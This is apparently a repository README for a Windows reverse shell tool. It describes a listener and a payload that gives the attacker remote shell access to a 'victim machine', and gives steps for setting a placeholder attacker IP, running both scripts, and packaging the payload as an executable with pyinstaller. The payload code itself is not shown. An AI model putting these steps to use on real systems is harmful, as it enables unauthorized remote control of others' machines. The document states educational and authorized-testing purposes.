# 🐚 Windows Reverse Shell

> **⚠️ WARNING: This tool is intended strictly for educational and authorized security testing purposes only.**  
> **Do not use this on systems you do not own or without explicit permission. Unauthorized access is illegal and unethical.**

---

## 📄 Overview

This repository contains a basic reverse shell implementation for **Windows** environments.

It includes:

- `listener.py` – A simple listener script to receive the reverse connection.
- `payload.pyw` – A reverse shell payload script to be executed on the target machine.

Once the payload is executed, it connects back to the listener, providing the attacker (you) with remote shell access to the victim machine — assuming both are on the same network or the connection is allowed through firewalls/NAT.

---

## ⚙️ Usage Instructions

### 🔧 Step 1: Configure the Payload

Before running anything, you need to edit the `payload.pyw` file.

```python
IP = "YOUR.ATTACKER.IP.HERE"
PORT = 4444  # Default port, can be changed
````

Replace the IP with the IP address of your attacker/listener machine (i.e., where `listener.py` will be running).

---

### 💻 Step 2: Start the Listener

Run the `listener.py` script on your machine (attacker system):

```bash
python listener.py
```

This will start a socket server and wait for incoming reverse shell connections.

---

### 🧪 Step 3: Execute the Payload

Run the `payload.py` script on the target system (the system you're testing with proper authorization).

```bash
python payload.py
```

Alternatively, you can convert the payload into an executable:

```bash
pyinstaller --onefile payload.py
```

Once executed, the payload will attempt to connect back to the listener and provide shell access.

---

## ✅ Recommended Use Cases

This tool is intended for **ethical and educational purposes**, including:

* Penetration testing (with permission)
* Red team simulations
* Cybersecurity training labs
* Capture The Flag (CTF) challenges
* Learning how reverse shells work

---

## ❌ Forbidden Use Cases

This tool **must not** be used for:

* Unauthorized access to any systems or networks
* Exploiting machines without consent
* Illegal hacking or malicious activities
* Bypassing organizational or personal security measures

Using this tool irresponsibly or illegally may result in **criminal charges**.

---

## 🔐 Security Notes

* Only run this in **controlled lab environments** (e.g., virtual machines).
* Always ensure your testing is **authorized** and **legal**.
* Firewalls and antivirus software may detect and block the payload.
* Test safely and ethically.

---

## 📜 Legal Disclaimer

This project is provided for **educational and research purposes only**.

The creator(s) of this repository are **not responsible** for any misuse, damage, loss, or legal consequences resulting from the use of this tool.
By using this code, **you agree** to use it **at your own risk** and only in compliance with all applicable laws.

---

## 🙌 Final Note

Cybersecurity is about **defense, not destruction**.
This tool is meant to help you **understand vulnerabilities** so we can all build safer systems.

**Use responsibly. Hack ethically.**
